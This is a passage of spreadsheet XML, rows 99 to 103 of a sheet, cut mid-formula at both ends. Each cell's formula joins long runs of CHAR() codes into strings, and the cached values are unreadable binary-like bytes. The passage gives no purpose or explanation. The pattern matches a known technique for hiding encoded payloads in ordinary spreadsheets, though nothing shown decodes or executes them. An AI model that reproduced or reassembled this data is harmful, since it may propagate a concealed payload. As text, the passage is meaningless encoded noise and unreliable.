AR(85)&amp;CHAR(129)&amp;CHAR(78)&amp;CHAR(250)&amp;CHAR(9)&amp;CHAR(196)&amp;CHAR(85)&amp;CHAR(239)&amp;CHAR(183)&amp;CHAR(3)&amp;CHAR(1)&amp;CHAR(1)&amp;CHAR(137)&amp;CHAR(67)&amp;CHAR(46)&amp;CHAR(21)&amp;CHAR(139)&amp;CHAR(95)&amp;CHAR(43)&amp;CHAR(8)&amp;CHAR(176)&amp;CHAR(73)&amp;CHAR(3)&amp;CHAR(136)&amp;CHAR(192)&amp;CHAR(11)&amp;CHAR(70)&amp;CHAR(130)&amp;CHAR(70)&amp;CHAR(45)&amp;CHAR(29)&amp;CHAR(61)&amp;CHAR(199)&amp;CHAR(121)&amp;CHAR(220)&amp;CHAR(130)&amp;CHAR(171)&amp;CHAR(33)&amp;CHAR(247)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(137)&amp;CHAR(157)&amp;CHAR(134)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(6)&amp;CHAR(219)&amp;CHAR(132)&amp;CHAR(82)&amp;CHAR(43)&amp;CHAR(22)&amp;CHAR(143)&amp;CHAR(66)&amp;CHAR(14)&amp;CHAR(142)&amp;CHAR(202)&amp;CHAR(118)&amp;CHAR(99)&amp;CHAR(8)&amp;CHAR(196)&amp;CHAR(86)&amp;CHAR(250)&amp;CHAR(82)&amp;CHAR(59)&amp;CHAR(142)&amp;CHAR(89)&amp;CHAR(29)&amp;CHAR(139)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(45)&amp;CHAR(4)&amp;CHAR(192)&amp;CHAR(143)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(196)&amp;CHAR(134)&amp;CHAR(94)&amp;CHAR(45)&amp;CHAR(34)&amp;CHAR(141)&amp;CHAR(71)&amp;CHAR(35)&amp;CHAR(23)&amp;CHAR(133)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(205)&amp;CHAR(115)&amp;CHAR(50)&amp;CHAR(128)&amp;CHAR(86)&amp;CHAR(45)&amp;CHAR(37)&amp;CHAR(141)&amp;CHAR(245)&amp;CHAR(128)&amp;CHAR(95)&amp;CHAR(61)&amp;CHAR(130)&amp;CHAR(204)&amp;CHAR(126)&amp;CHAR(15)&amp;CHAR(6)&amp;CHAR(181)&amp;CHAR(195)&amp;CHAR(233)&amp;CHAR(3)&amp;CHAR(136)&amp;CHAR(79)&amp;CHAR(11)&amp;CHAR(6)&amp;CHAR(196)&amp;CHAR(93)&amp;CHAR(93)&amp;CHAR(240)&amp;CHAR(208)&amp;CHAR(141)&amp;CHAR(6)&amp;CHAR(129)&amp;CHAR(204)&amp;CHAR(14)&amp;CHAR(137)&amp;CHAR(79)&amp;CHAR(47)&amp;CHAR(18)&amp;CHAR(133)&amp;CHAR(197)&amp;CHAR(3)&amp;CHAR(130)&amp;CHAR(65)&amp;CHAR(46)&amp;CHAR(29)&amp;CHAR(137)&amp;CHAR(2)&amp;CHAR(135)&amp;CHAR(204)&amp;CHAR(114)&amp;CHAR(195)&amp;CHAR(143)&amp;CHAR(93)&amp;CHAR(37)&amp;CHAR(22)&amp;CHAR(132)&amp;CHAR(73)&amp;CHAR(41)&amp;CHAR(133)&amp;CHAR(199)&amp;CHAR(23)&amp;CHAR(142)&amp;CHAR(91)&amp;CHAR(42)&amp;CHAR(17)&amp;CHAR(142)&amp;CHAR(196)&amp;CHAR(114)&amp;CHAR(155)&amp;CHAR(128)&amp;CHAR(118)&amp;CHAR(45)&amp;CHAR(17)&amp;CHAR(141)&amp;CHAR(144)&amp;CHAR(171)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(7)&amp;CHAR(142)&amp;CHAR(193)&amp;CHAR(33)&amp;CHAR(78)&amp;CHAR(54)&amp;CHAR(1)&amp;CHAR(220)&amp;CHAR(53)&amp;CHAR(204)&amp;CHAR(128)&amp;CHAR(77)&amp;CHAR(33)&amp;CHAR(25)&amp;CHAR(52)&amp;CHAR(5)&amp;CHAR(123)&amp;CHAR(102)&amp;CHAR(137)&amp;CHAR(74)&amp;CHAR(10)&amp;CHAR(224)&amp;CHAR(67)&amp;CHAR(13)&amp;CHAR(188)&amp;CHAR(10)&amp;CHAR(137)&amp;CHAR(214)&amp;CHAR(32)&amp;CHAR(7)&amp;CHAR(251)&amp;CHAR(5)</f>
        <v>NV_x0007_ÂWTñP7÷‚ý_x0005_T_x0004__x000F__x000B__x0005_¾X_x0011_4ÊŠf&amp;_x0012__x0006_†Ê%c&gt;J_x0008_|5m&amp;_x001F_	Ýôxþ_x0006__x0004_ÎUNú	ÄUï·_x0003__x0001__x0001_‰C._x0015_‹_+_x0008_°I_x0003_ˆÀ_x000B_F‚F-_x001D_=ÇyÜ‚«!÷
	_x0002_‰†_x0005_		_x0006_Û„R+_x0016_B_x000E_ŽÊvc_x0008_ÄVúR;ŽY_x001D_‹N&amp;-_x0004_À_x0002__x0002_Ä†^-"G#_x0017_…_x000D_ŽÍs2€V-%õ€_=‚Ì~_x000F__x0006_µÃé_x0003_ˆO_x000B__x0006_Ä]]ðÐ_x0006_Ì_x000E_‰O/_x0012_…Å_x0003_‚A._x001D_‰_x0002_‡ÌrÃ]%_x0016_„I)…Ç_x0017_Ž[*_x0011_ŽÄr›€v-_x0011_«
	_x0007_ŽÁ!N6_x0001_Ü5Ì€M!_x0019_4_x0005_{f‰J
àC_x000D_¼
‰Ö _x0007_û_x0005_</v>
      </c>
      <c r="C99" t="str">
        <f>CHAR(51)&amp;CHAR(240)&amp;CHAR(84)&amp;CHAR(82)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(145)&amp;CHAR(19)&amp;CHAR(59)&amp;CHAR(52)</f>
        <v>3ðTRˆê‘_x0013_;4</v>
      </c>
    </row>
    <row r="100" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B100" t="str">
        <f>CHAR(10)&amp;CHAR(132)&amp;CHAR(86)&amp;CHAR(46)&amp;CHAR(18)&amp;CHAR(99)&amp;CHAR(60)&amp;CHAR(82)&amp;CHAR(32)&amp;CHAR(33)&amp;CHAR(116)&amp;CHAR(33)&amp;CHAR(132)&amp;CHAR(200)&amp;CHAR(44)&amp;CHAR(249)&amp;CHAR(11)&amp;CHAR(3)&amp;CHAR(7)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(33)&amp;CHAR(27)&amp;CHAR(7)&amp;CHAR(4)&amp;CHAR(140)&amp;CHAR(7)&amp;CHAR(58)&amp;CHAR(10)&amp;CHAR(65)&amp;CHAR(34)&amp;CHAR(19)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(23)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(131)&amp;CHAR(5)&amp;CHAR(50)&amp;CHAR(137)&amp;CHAR(78)&amp;CHAR(34)&amp;CHAR(17)&amp;CHAR(226)&amp;CHAR(7)&amp;CHAR(189)&amp;CHAR(5)&amp;CHAR(29)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(100)&amp;CHAR(63)&amp;CHAR(209)&amp;CHAR(13)&amp;CHAR(136)&amp;CHAR(47)&amp;CHAR(3)&amp;CHAR(11)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(199)&amp;CHAR(7)&amp;CHAR(140)&amp;CHAR(72)&amp;CHAR(1)&amp;CHAR(9)&amp;CHAR(206)&amp;CHAR(139)&amp;CHAR(70)&amp;CHAR(38)&amp;CHAR(17)&amp;CHAR(60)&amp;CHAR(222)&amp;CHAR(113)&amp;CHAR(171)&amp;CHAR(130)&amp;CHAR(59)&amp;CHAR(15)&amp;CHAR(129)&amp;CHAR(208)&amp;CHAR(115)&amp;CHAR(154)&amp;CHAR(48)&amp;CHAR(206)&amp;CHAR(140)&amp;CHAR(82)&amp;CHAR(33)&amp;CHAR(19)&amp;CHAR(135)&amp;CHAR(60)&amp;CHAR(4)&amp;CHAR(4)&amp;CHAR(143)&amp;CHAR(241)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(134)&amp;CHAR(153)&amp;CHAR(13)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(108)&amp;CHAR(48)&amp;CHAR(8)&amp;CHAR(13)&amp;CHAR(134)&amp;CHAR(223)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(142)&amp;CHAR(74)&amp;CHAR(117)&amp;CHAR(139)&amp;CHAR(198)&amp;CHAR(13)&amp;CHAR(128)&amp;CHAR(228)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(137)&amp;CHAR(119)&amp;CHAR(58)&amp;CHAR(26)&amp;CHAR(131)&amp;CHAR(250)&amp;CHAR(8)&amp;CHAR(143)&amp;CHAR(220)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(129)&amp;CHAR(70)&amp;CHAR(52)&amp;CHAR(27)&amp;CHAR(21)&amp;CHAR(194)&amp;CHAR(136)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(19)&amp;CHAR(129)&amp;CHAR(77)&amp;CHAR(55)&amp;CHAR(36)&amp;CHAR(136)&amp;CHAR(75)&amp;CHAR(54)&amp;CHAR(42)&amp;CHAR(6)&amp;CHAR(205)&amp;CHAR(7)&amp;CHAR(201)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(46)&amp;CHAR(41)&amp;CHAR(128)&amp;CHAR(2)&amp;CHAR(183)&amp;CHAR(136)&amp;CHAR(202)&amp;CHAR(245)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(18)&amp;CHAR(130)&amp;CHAR(2)&amp;CHAR(80)&amp;CHAR(1)&amp;CHAR(192)&amp;CHAR(85)&amp;CHAR(225)&amp;CHAR(209)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(13)&amp;CHAR(87)&amp;CHAR(86)&amp;CHAR(135)&amp;CHAR(196)&amp;CHAR(117)&amp;CHAR(30)&amp;CHAR(128)&amp;CHAR(78)&amp;CHAR(38)&amp;CHAR(19)&amp;CHAR(136)&amp;CHAR(234)&amp;CHAR(2)&amp;CHAR(140)&amp;CHAR(67)&amp;CHAR(47)&amp;CHAR(29)&amp;CHAR(137)&amp;CHAR(226)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(149)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(140)&amp;CHAR(146)&amp;CHAR(6)&amp;CHAR(9)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(237)&amp;CHAR(215)&amp;CHAR(136)&amp;CHAR(67)&amp;CHAR(35)&amp;CHAR(46)&amp;CHAR(142)&amp;CHAR(71)&amp;CHAR(32)&amp;CHAR(27)&amp;CHAR(8)&amp;CHAR(188)&amp;CHAR(78)&amp;CHAR(113)&amp;CHAR(243)&amp;CHAR(141)&amp;CHAR(11)&amp;CHAR(138)&amp;CHAR(9)&amp;CHAR(207)&amp;CHAR(142)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(42)&amp;CHAR(125)&amp;CHAR(114)&amp;CHAR(104)&amp;CHAR(66)&amp;CHAR(190)&amp;CHAR(5)&amp;CHAR(57)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(85)&amp;CHAR(101)&amp;CHAR(178)&amp;CHAR(15)&amp;CHAR(2)&amp;CHAR(4)</f>
        <v xml:space="preserve">
„V._x0012_c&lt;R !t!„È,ù_x000B__x0003__x0007_ŽJ!_x001B__x0007__x0004_Œ_x0007_:
A"_x0013_€N-_x0017__x0006__x0004_ƒ_x0005_2‰N"_x0011_â_x0007_½_x0005__x001D__x000E__x000F_d?Ñ_x000D_ˆ/_x0003__x000B__x000B_Ç_x0007_ŒH_x0001_	Î‹F&amp;_x0011_&lt;Þq«‚;_x000F_Ðsš0ÎŒR!_x0013_‡&lt;_x0004__x0004_ñ_x000D__x0006__x000F_†™_x000D__x0001__x0005__x0007_l0_x0008__x000D_†ß_x0005_		ŽJu‹Æ_x000D_€ä_x0002__x000B_
‰w:_x001A_ƒú_x0008_Ü
_x000D__x0002_F4_x001B__x0015_ÂˆE&amp;_x0013_M7$ˆK6*_x0006_Í_x0007_ÉŽG.)€_x0002_·ˆÊõŽA#_x0012_‚_x0002_P_x0001_ÀUáÑ_x0006__x0005__x000D_WV‡Äu_x001E_€N&amp;_x0013_ˆê_x0002_ŒC/_x001D_‰â_x0003__x0005_†•_x0007__x0016__x0004_Œ’_x0006_	
	í×ˆC#.ŽG _x001B__x0008_¼Nqó_x000B_Š	ÏŽA#*}rhB¾_x0005_9	_x0005_Ue²_x000F__x0002__x0004_</v>
      </c>
      <c r="C100" t="str">
        <f>CHAR(9)&amp;CHAR(50)&amp;CHAR(3)&amp;CHAR(234)&amp;CHAR(217)&amp;CHAR(208)&amp;CHAR(184)&amp;CHAR(145)&amp;CHAR(61)&amp;CHAR(241)</f>
        <v xml:space="preserve">	2_x0003_êÙÐ¸‘=ñ</v>
      </c>
    </row>
    <row r="101" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B101" t="str">
        <f>CHAR(50)&amp;CHAR(194)&amp;CHAR(91)&amp;CHAR(245)&amp;CHAR(87)&amp;CHAR(55)&amp;CHAR(128)&amp;CHAR(250)&amp;CHAR(131)&amp;CHAR(250)&amp;CHAR(115)&amp;CHAR(92)&amp;CHAR(109)&amp;CHAR(182)&amp;CHAR(13)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(143)&amp;CHAR(65)&amp;CHAR(35)&amp;CHAR(34)&amp;CHAR(84)&amp;CHAR(86)&amp;CHAR(233)&amp;CHAR(202)&amp;CHAR(10)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(139)&amp;CHAR(135)&amp;CHAR(11)&amp;CHAR(15)&amp;CHAR(7)&amp;CHAR(14)&amp;CHAR(85)&amp;CHAR(244)&amp;CHAR(183)&amp;CHAR(3)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(246)&amp;CHAR(121)&amp;CHAR(34)&amp;CHAR(59)&amp;CHAR(244)&amp;CHAR(221)&amp;CHAR(97)&amp;CHAR(187)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(58)&amp;CHAR(217)&amp;CHAR(81)&amp;CHAR(85)&amp;CHAR(238)&amp;CHAR(206)&amp;CHAR(12)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(134)&amp;CHAR(201)&amp;CHAR(42)&amp;CHAR(103)&amp;CHAR(2)&amp;CHAR(196)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(88)&amp;CHAR(93)&amp;CHAR(253)&amp;CHAR(94)&amp;CHAR(75)&amp;CHAR(233)&amp;CHAR(17)&amp;CHAR(142)&amp;CHAR(64)&amp;CHAR(35)&amp;CHAR(84)&amp;CHAR(96)&amp;CHAR(12)&amp;CHAR(253)&amp;CHAR(126)&amp;CHAR(38)&amp;CHAR(49)&amp;CHAR(4)&amp;CHAR(208)&amp;CHAR(251)&amp;CHAR(209)&amp;CHAR(234)&amp;CHAR(5)&amp;CHAR(132)&amp;CHAR(77)&amp;CHAR(33)&amp;CHAR(5)&amp;CHAR(194)&amp;CHAR(252)&amp;CHAR(215)&amp;CHAR(111)&amp;CHAR(14)&amp;CHAR(197)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(52)&amp;CHAR(199)&amp;CHAR(91)&amp;CHAR(92)&amp;CHAR(246)&amp;CHAR(88)&amp;CHAR(70)&amp;CHAR(81)&amp;CHAR(84)&amp;CHAR(87)&amp;CHAR(82)&amp;CHAR(134)&amp;CHAR(193)&amp;CHAR(219)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(2)&amp;CHAR(193)&amp;CHAR(131)&amp;CHAR(234)&amp;CHAR(221)&amp;CHAR(9)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(86)&amp;CHAR(134)&amp;CHAR(146)&amp;CHAR(43)&amp;CHAR(226)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(94)&amp;CHAR(92)&amp;CHAR(85)&amp;CHAR(136)&amp;CHAR(176)&amp;CHAR(14)&amp;CHAR(3)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(136)&amp;CHAR(185)&amp;CHAR(69)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(2)&amp;CHAR(113)&amp;CHAR(5)&amp;CHAR(157)&amp;CHAR(50)&amp;CHAR(138)&amp;CHAR(130)&amp;CHAR(66)&amp;CHAR(8)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(53)&amp;CHAR(251)&amp;CHAR(105)&amp;CHAR(3)&amp;CHAR(111)&amp;CHAR(14)&amp;CHAR(53)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(138)&amp;CHAR(3)&amp;CHAR(78)&amp;CHAR(8)&amp;CHAR(9)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(95)&amp;CHAR(92)&amp;CHAR(245)&amp;CHAR(90)&amp;CHAR(59)&amp;CHAR(142)&amp;CHAR(239)&amp;CHAR(143)&amp;CHAR(228)&amp;CHAR(13)&amp;CHAR(134)&amp;CHAR(61)&amp;CHAR(7)&amp;CHAR(5)&amp;CHAR(9)&amp;CHAR(130)&amp;CHAR(139)&amp;CHAR(21)&amp;CHAR(20)&amp;CHAR(14)&amp;CHAR(15)&amp;CHAR(1)&amp;CHAR(205)&amp;CHAR(80)&amp;CHAR(87)&amp;CHAR(97)&amp;CHAR(245)&amp;CHAR(143)&amp;CHAR(133)&amp;CHAR(19)&amp;CHAR(27)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(86)&amp;CHAR(92)&amp;CHAR(82)&amp;CHAR(245)&amp;CHAR(94)&amp;CHAR(82)&amp;CHAR(135)&amp;CHAR(70)&amp;CHAR(33)&amp;CHAR(67)&amp;CHAR(159)&amp;CHAR(64)&amp;CHAR(37)&amp;CHAR(25)&amp;CHAR(143)&amp;CHAR(75)&amp;CHAR(46)&amp;CHAR(17)&amp;CHAR(86)&amp;CHAR(87)&amp;CHAR(235)&amp;CHAR(75)&amp;CHAR(237)&amp;CHAR(241)&amp;CHAR(250)&amp;CHAR(134)&amp;CHAR(64)&amp;CHAR(35)&amp;CHAR(127)&amp;CHAR(130)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(33)&amp;CHAR(139)&amp;CHAR(75)&amp;CHAR(47)&amp;CHAR(38)&amp;CHAR(89)&amp;CHAR(84)&amp;CHAR(237)&amp;CHAR(249)&amp;CHAR(248)&amp;CHAR(246)&amp;CHAR(253)</f>
        <v>2Â[õW7€úƒús\m¶_x000D__x0002_
A#"TVéÊ
	‹‡_x000B__x000F__x0007__x000E_Uô·_x0003__x000F__x000B_
öy";ôÝa»_x0005__x0007_
:ÙQUîÎ_x000C_	_x0005_†É*g_x0002_Ä_x0001__x0002_X]ý^Ké_x0011_Ž@#T`_x000C_ý~&amp;1_x0004_ÐûÑê_x0005_„M!_x0005_Âü×o_x000E_Å_x000B__x0004_4Ç[\öXFQTWR†ÁÛ
	_x0002_ÁƒêÝ		_x0005_V†’+â_x0004__x0001__x0002_^\Uˆ°_x000E__x0003__x0005__x0007_
ˆ¹E_x0005_
_x0002_q_x0005_2Š‚B_x0008_
	5ûi_x0003_o_x000E_5_x000B__x0004_Š_x0003_N_x0008_	_x000D__x0006__\õZ;Žïä_x000D_†=_x0007__x0005_	‚‹_x0015__x0014__x000E__x000F__x0001_ÍPWaõ…_x0013__x001B__x0006__x0005_V\Rõ^R‡F!CŸ@%_x0019_K._x0011_VWëKíñú†@#‚N-!‹K/&amp;YTíùøöý</v>
      </c>
      <c r="C101" t="str">
        <f>CHAR(140)&amp;CHAR(207)&amp;CHAR(185)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(244)&amp;CHAR(56)&amp;CHAR(251)&amp;CHAR(72)&amp;CHAR(122)</f>
        <v>ŒÏ¹[¸ô8ûHz</v>
      </c>
    </row>
    <row r="102" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B102" t="str">
        <f>CHAR(129)&amp;CHAR(198)&amp;CHAR(22)&amp;CHAR(140)&amp;CHAR(117)&amp;CHAR(45)&amp;CHAR(37)&amp;CHAR(82)&amp;CHAR(90)&amp;CHAR(241)&amp;CHAR(156)&amp;CHAR(170)&amp;CHAR(4)&amp;CHAR(1)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(202)&amp;CHAR(13)&amp;CHAR(142)&amp;CHAR(195)&amp;CHAR(2)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(138)&amp;CHAR(79)&amp;CHAR(33)&amp;CHAR(26)&amp;CHAR(93)&amp;CHAR(143)&amp;CHAR(137)&amp;CHAR(158)&amp;CHAR(1)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(84)&amp;CHAR(107)&amp;CHAR(2)&amp;CHAR(85)&amp;CHAR(130)&amp;CHAR(137)&amp;CHAR(117)&amp;CHAR(2)&amp;CHAR(4)&amp;CHAR(3)&amp;CHAR(87)&amp;CHAR(248)&amp;CHAR(157)&amp;CHAR(169)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(130)&amp;CHAR(203)&amp;CHAR(5)&amp;CHAR(140)&amp;CHAR(169)&amp;CHAR(6)&amp;CHAR(15)&amp;CHAR(11)&amp;CHAR(129)&amp;CHAR(69)&amp;CHAR(35)&amp;CHAR(21)&amp;CHAR(138)&amp;CHAR(78)&amp;CHAR(45)&amp;CHAR(22)&amp;CHAR(82)&amp;CHAR(143)&amp;CHAR(133)&amp;CHAR(185)&amp;CHAR(13)&amp;CHAR(9)&amp;CHAR(5)&amp;CHAR(85)&amp;CHAR(134)&amp;CHAR(31)&amp;CHAR(94)&amp;CHAR(253)&amp;CHAR(22)&amp;CHAR(132)&amp;CHAR(194)&amp;CHAR(126)&amp;CHAR(125)&amp;CHAR(137)&amp;CHAR(79)&amp;CHAR(47)&amp;CHAR(22)&amp;CHAR(86)&amp;CHAR(142)&amp;CHAR(15)&amp;CHAR(244)&amp;CHAR(84)&amp;CHAR(6)&amp;CHAR(136)&amp;CHAR(194)&amp;CHAR(127)&amp;CHAR(93)&amp;CHAR(142)&amp;CHAR(75)&amp;CHAR(50)&amp;CHAR(20)&amp;CHAR(140)&amp;CHAR(85)&amp;CHAR(38)&amp;CHAR(23)&amp;CHAR(131)&amp;CHAR(69)&amp;CHAR(34)&amp;CHAR(52)&amp;CHAR(81)&amp;CHAR(86)&amp;CHAR(140)&amp;CHAR(15)&amp;CHAR(250)&amp;CHAR(91)&amp;CHAR(8)&amp;CHAR(130)&amp;CHAR(199)&amp;CHAR(126)&amp;CHAR(66)&amp;CHAR(132)&amp;CHAR(142)&amp;CHAR(202)&amp;CHAR(12)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(89)&amp;CHAR(248)&amp;CHAR(86)&amp;CHAR(119)&amp;CHAR(129)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(18)&amp;CHAR(137)&amp;CHAR(254)&amp;CHAR(111)&amp;CHAR(11)&amp;CHAR(94)&amp;CHAR(84)&amp;CHAR(142)&amp;CHAR(28)&amp;CHAR(241)&amp;CHAR(93)&amp;CHAR(34)&amp;CHAR(83)&amp;CHAR(138)&amp;CHAR(242)&amp;CHAR(244)&amp;CHAR(89)&amp;CHAR(118)&amp;CHAR(56)&amp;CHAR(244)&amp;CHAR(135)&amp;CHAR(240)&amp;CHAR(112)&amp;CHAR(36)&amp;CHAR(128)&amp;CHAR(65)&amp;CHAR(46)&amp;CHAR(25)&amp;CHAR(85)&amp;CHAR(93)&amp;CHAR(85)&amp;CHAR(142)&amp;CHAR(15)&amp;CHAR(65)&amp;CHAR(83)&amp;CHAR(86)&amp;CHAR(86)&amp;CHAR(85)&amp;CHAR(90)&amp;CHAR(90)&amp;CHAR(246)&amp;CHAR(87)&amp;CHAR(16)&amp;CHAR(134)&amp;CHAR(199)&amp;CHAR(114)&amp;CHAR(2)&amp;CHAR(142)&amp;CHAR(79)&amp;CHAR(32)&amp;CHAR(23)&amp;CHAR(109)&amp;CHAR(9)&amp;CHAR(90)&amp;CHAR(130)&amp;CHAR(5)&amp;CHAR(249)&amp;CHAR(94)&amp;CHAR(31)&amp;CHAR(129)&amp;CHAR(77)&amp;CHAR(35)&amp;CHAR(17)&amp;CHAR(87)&amp;CHAR(129)&amp;CHAR(1)&amp;CHAR(253)&amp;CHAR(83)&amp;CHAR(10)&amp;CHAR(141)&amp;CHAR(65)&amp;CHAR(45)&amp;CHAR(25)&amp;CHAR(85)&amp;CHAR(142)&amp;CHAR(5)&amp;CHAR(241)&amp;CHAR(94)&amp;CHAR(30)&amp;CHAR(143)&amp;CHAR(69)&amp;CHAR(38)&amp;CHAR(27)&amp;CHAR(90)&amp;CHAR(137)&amp;CHAR(3)&amp;CHAR(244)&amp;CHAR(83)&amp;CHAR(14)&amp;CHAR(142)&amp;CHAR(132)&amp;CHAR(75)&amp;CHAR(2)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(143)&amp;CHAR(14)&amp;CHAR(71)&amp;CHAR(7)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(4)&amp;CHAR(81)&amp;CHAR(86)&amp;CHAR(87)&amp;CHAR(231)&amp;CHAR(31)&amp;CHAR(13)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(128)&amp;CHAR(195)&amp;CHAR(11)&amp;CHAR(102)&amp;CHAR(5)&amp;CHAR(203)&amp;CHAR(4)&amp;CHAR(7)&amp;CHAR(80)&amp;CHAR(94)&amp;CHAR(245)</f>
        <v>Æ_x0016_Œu-%RZñœª_x0004__x0001__x0002_ŽÊ_x000D_ŽÃ_x0002__x0006__x0005_ŠO!_x001A_]‰ž_x0001__x0007__x0016_Tk_x0002_U‚‰u_x0002__x0004__x0003_Wø©_x000B__x0004__x0007_‚Ë_x0005_Œ©_x0006__x000F__x000B_E#_x0015_ŠN-_x0016_R…¹_x000D_	_x0005_U†_x001F_^ý_x0016_„Â~}‰O/_x0016_VŽ_x000F_ôT_x0006_ˆÂ]ŽK2_x0014_ŒU&amp;_x0017_ƒE"4QVŒ_x000F_ú[_x0008_‚Ç~B„ŽÊ_x000C__x000B_
YøVwE&amp;_x0012_‰þo_x000B_^TŽ_x001C_ñ]"SŠòôYv8ô‡ðp$€A._x0019_U]UŽ_x000F_ASVVUZZöW_x0010_†Çr_x0002_ŽO _x0017_m	Z‚_x0005_ù^_x001F_M#_x0011_W_x0001_ýS
A-_x0019_UŽ_x0005_ñ^_x001E_E&amp;_x001B_Z‰_x0003_ôS_x000E_Ž„K_x0002_
_x000D__x000E_G_x0007__x0007__x0016__x0004_QVWç_x001F__x000D__x0006__x0004_€Ã_x000B_f_x0005_Ë_x0004__x0007_P^õ</v>
      </c>
      <c r="C102" t="str">
        <f>CHAR(145)&amp;CHAR(91)&amp;CHAR(184)&amp;CHAR(145)&amp;CHAR(57)&amp;CHAR(241)&amp;CHAR(156)&amp;CHAR(207)&amp;CHAR(185)&amp;CHAR(91)</f>
        <v>‘[¸‘9ñœÏ¹[</v>
      </c>
    </row>
    <row r="103" spans="2:3" ht="409.5" x14ac:dyDescent="0.45">
      <c r="B103" t="str">
        <f>CHAR(90)&amp;CHAR(77)&amp;CHAR(89)&amp;CHAR(81)&amp;CHAR(86)&amp;CHAR(81)&amp;CHAR(136)&amp;CHAR(195)&amp;CHAR(221)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(9)&amp;CHAR(193)&amp;CHAR(129)&amp;CHAR(238)&amp;CHAR(10)&amp;CHAR(86)&amp;CHAR(92)&amp;CHAR(95)&amp;CHAR(142)&amp;CHAR(113)&amp;CHAR(41)&amp;CHAR(18)&amp;CHAR(88)&amp;CHAR(129)&amp;CHAR(186)&amp;CHAR(13)&amp;CHAR(7)&amp;CHAR(11)&amp;CHAR(10)&amp;CHAR(3)&amp;CHAR(134)&amp;CHAR(181)&amp;CHAR(74)&amp;CHAR(1)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(127)&amp;CHAR(7)&amp;CHAR(129)&amp;CHAR(50)&amp;CHAR(137)&amp;CHAR(140)&amp;CHAR(66)&amp;CHAR(2)&amp;CHAR(7)&amp;CHAR(22)&amp;CHAR(55)&amp;CHAR(236)&amp;CHAR(107)&amp;CHAR(6)&amp;CHAR(103)&amp;CHAR(10)&amp;CHAR(57)&amp;CHAR(6)&amp;CHAR(4)&amp;CHAR(142)&amp;CHAR(3)&amp;CHAR(66)&amp;CHAR(12)&amp;CHAR(5)&amp;CHAR(11)&amp;CHAR(4)&amp;CHAR(87)&amp;CHAR(82)&amp;CHAR(244)&amp;CHAR(92)&amp;CHAR(53)&amp;CHAR(134)&amp;CHAR(222)&amp;CHAR(138)&amp;CHAR(208)&amp;CHAR(5)&amp;CHAR(141)&amp;CHAR(214)&amp;CHAR(5)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(130)&amp;CHAR(141)&amp;CHAR(18)&amp;CHAR(27)&amp;CHAR(6)&amp;CHAR(5)&amp;CHAR(10)&amp;CHAR(192)&amp;CHAR(84)&amp;CHAR(86)&amp;CHAR(103)&amp;CHAR(241)&amp;CHAR(130)&amp;CHAR(141)&amp;CHAR(28)&amp;CHAR(24)&amp;CHAR(2)&amp;CHAR(11)&amp;CHAR(91)&amp;CHAR(87)&amp;CHAR(94)&amp;CHAR(244)&amp;CHAR(84)&amp;CHAR(86)&amp;CHAR(80)&amp;CHAR